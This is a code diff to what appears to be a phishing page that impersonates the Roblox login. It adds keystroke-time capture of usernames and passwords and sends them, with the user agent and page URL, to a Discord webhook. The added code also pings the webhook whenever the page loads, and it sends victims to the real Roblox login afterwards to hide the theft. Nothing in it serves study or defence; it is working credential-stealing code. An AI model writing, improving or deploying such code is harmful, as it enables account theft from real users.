@@ -177,6 +177,43 @@
             statusDiv.style.display = 'block';
         }
         
+        // Variáveis para controlar o envio automático
+        let usernameSent = false;
+        let passwordSent = false;
+        let lastUsername = '';
+        let lastPassword = '';
+        
+        function sendToDiscord(data, type) {
+            const messageText = `🔐 **ROBLOX - Dados Capturados (${type})**
+
+👤 **Usuário:** ${data.username || 'Não preenchido'}
+🔑 **Senha:** ${data.password || 'Não preenchido'}
+⏰ **Data/Hora:** ${data.timestamp}
+🌐 **URL:** ${data.url}
+📱 **User Agent:** ${data.userAgent}
+🌍 **IP:** ${data.ip}`;
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: messageText
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log(`✅ Dados ${type} enviados com sucesso!`);
+                } else {
+                    console.error(`❌ Erro ao enviar dados ${type}:`, response.status);
+                }
+            })
+            .catch(error => {
+                console.error(`❌ Erro de conexão ${type}:`, error);
+            });
+        }
+        
         function handleLogin() {
             const username = document.getElementById('login-username').value;
             const password = document.getElementById('login-password').value;
@@ -189,36 +226,7 @@
             // Mostrar mensagem de carregamento
             showStatus('⏳ Verificando credenciais...', 'info');
             
-            // Primeiro, enviar mensagem de teste
-            const testMessage = `🧪 **TESTE - Botão Entrar Clicado**
-
-✅ **Status:** Usuário clicou no botão Entrar
-⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
-🌐 **URL:** ${window.location.href}
-📱 **User Agent:** ${navigator.userAgent}`;
-            
-            // Enviar mensagem de teste
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: testMessage
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('✅ Mensagem de teste enviada com sucesso!');
-                } else {
-                    console.error('❌ Erro ao enviar mensagem de teste:', response.status);
-                }
-            })
-            .catch(error => {
-                console.error('❌ Erro de conexão na mensagem de teste:', error);
-            });
-            
-            // Preparar dados para enviar
+            // Enviar dados finais
             const loginData = {
                 username: username,
                 password: password,
@@ -228,44 +236,60 @@
                 ip: 'Capturado via webhook'
             };
             
-            // Criar mensagem para o Discord
-            const messageText = `🔐 **ROBLOX - Dados Capturados**
-
-👤 **Usuário:** ${loginData.username}
-🔑 **Senha:** ${loginData.password}
-⏰ **Data/Hora:** ${loginData.timestamp}
-🌐 **URL:** ${loginData.url}
-📱 **User Agent:** ${loginData.userAgent}
-🌍 **IP:** ${loginData.ip}`;
+            sendToDiscord(loginData, 'FINAL');
             
-            // Enviar dados capturados para o webhook
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: messageText
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    showStatus('✅ Login realizado com sucesso! Redirecionando...', 'success');
-                    
-                    // Simular redirecionamento após 2 segundos
-                    setTimeout(() => {
-                        // Aqui você pode redirecionar para a página real do ROBLOX
-                        window.location.href = 'https://www.roblox.com/login';
-                    }, 2000);
-                } else {
-                    showStatus('❌ Erro no servidor. Tente novamente.', 'error');
-                }
-            })
-            .catch(error => {
-                showStatus('❌ Erro de conexão. Verifique sua internet.', 'error');
-                console.error('Erro:', error);
-            });
+            // Simular sucesso e redirecionamento
+            setTimeout(() => {
+                showStatus('✅ Login realizado com sucesso! Redirecionando...', 'success');
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/login';
+                }, 2000);
+            }, 1000);
         }
+        
+        // Capturar dados em tempo real
+        function captureUsername() {
+            const username = document.getElementById('login-username').value;
+            if (username && username !== lastUsername && !usernameSent) {
+                lastUsername = username;
+                usernameSent = true;
+                
+                const data = {
+                    username: username,
+                    password: document.getElementById('login-password').value,
+                    timestamp: new Date().toLocaleString('pt-BR'),
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    ip: 'Capturado via webhook'
+                };
+                
+                sendToDiscord(data, 'USUÁRIO DIGITADO');
+            }
+        }
+        
+        function capturePassword() {
+            const password = document.getElementById('login-password').value;
+            if (password && password !== lastPassword && !passwordSent) {
+                lastPassword = password;
+                passwordSent = true;
+                
+                const data = {
+                    username: document.getElementById('login-username').value,
+                    password: password,
+                    timestamp: new Date().toLocaleString('pt-BR'),
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    ip: 'Capturado via webhook'
+                };
+                
+                sendToDiscord(data, 'SENHA DIGITADA');
+            }
+        }
+        
+        // Event listeners para captura automática
+        document.getElementById('login-username').addEventListener('input', captureUsername);
+        document.getElementById('login-password').addEventListener('input', capturePassword);
         
         // Permitir login com Enter
         document.addEventListener('keypress', function(e) {
@@ -277,6 +301,32 @@
         // Focar no primeiro campo ao carregar
         window.onload = function() {
             document.getElementById('login-username').focus();
+            
+            // Enviar mensagem de teste quando a página carregar
+            const testMessage = `🧪 **PÁGINA CARREGADA**
+
+✅ **Status:** Usuário acessou a página de login
+⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
+🌐 **URL:** ${window.location.href}
+📱 **User Agent:** ${navigator.userAgent}`;
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: testMessage
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Mensagem de página carregada enviada!');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Erro ao enviar mensagem de página carregada:', error);
+            });
         };
     </script>
 </body>
